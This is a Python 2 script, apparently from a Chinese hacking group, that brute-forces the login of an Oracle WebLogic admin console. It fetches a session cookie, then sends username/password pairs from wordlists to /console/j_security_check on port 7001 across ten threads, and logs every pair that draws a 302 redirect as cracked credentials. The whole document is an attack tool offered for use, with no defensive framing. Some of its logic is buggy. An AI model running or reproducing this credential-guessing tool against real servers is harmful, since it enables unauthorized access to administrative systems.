#/usr/bin python
# -*- coding: cp936 -*-
import httplib,urllib,sys,os
import threading
import Queue
import re
def info():
    print '''

=========================================
            Weblogic login crack

              uage:xx.py url

          WelCome to www.paxmac.org    

                         By: 花开、若相惜
                           Pax.Mac Team
=========================================

    '''
if len(sys.argv) < 2:
    info()
else:
    url=sys.argv[1]
    info()
    uname_count = len(open('uname.txt','rU').readlines())
    print '你的账号条数：%d'%(uname_count)
    pwd_count = len(open('pwd.txt','rU').readlines())
    print '你的密码条数：%d'%(pwd_count)
    print '正在破解........'
    conn = httplib.HTTPConnection(url,7001)
    conn.request("GET",'/console/login/LoginForm.jsp')
    cookie=conn.getresponse().getheaders()
    string=str(cookie[1])
    pattern = re.compile(r'ADMINCONSOLESESSION=(.*);')
    match = pattern.search(string)
    if match:
        cookie=match.group()

queue=Queue.Queue()#创建一个队列对象

success=[]
class ThreadUrl(threading.Thread):
   def __init__(self,queue):
      threading.Thread.__init__(self)
      self.queue=queue
   def run(self):
       while True:
           try:
               if(Queue.Empty):
                   pwd=self.queue.get()
               else:
                    break
               params = urllib.urlencode({'j_username':LOG,
                          'j_password':pwd
                           })
               headers = {"Content-Type":"application/x-www-form-urlencoded",
                   "Connection":"Keep-Alive","Cookie":cookie}
               conn = httplib.HTTPConnection(url,7001)
               conn.request(method="POST",url='/console/j_security_check',body=params,headers=headers)
               response = conn.getresponse()
               if response.status == 302:
                   final="破解成功!^_^!账号：%s密码：%s"%(LOG,pwd)
                   print final
                   success.append(final)
               else:
                    conn.close()
           except:
                print '连接超时'
           self.queue.task_done()

def main():
    for i in range(10):
        t=ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
    names = [line.rstrip() for line in open("uname.txt")]
    pwds = [line.rstrip() for line in open("pwd.txt")]
    for log in names:
        global LOG
        LOG=''
        LOG=log
        for pwd in pwds:
            p=pwd
            queue.put(p)
        queue.join()
if __name__ == '__main__':
    main()
    txt=('%s.txt')%(sys.argv[1])
    for x in success:
        file=open(txt,'w')
        file.write(x)
    file.close()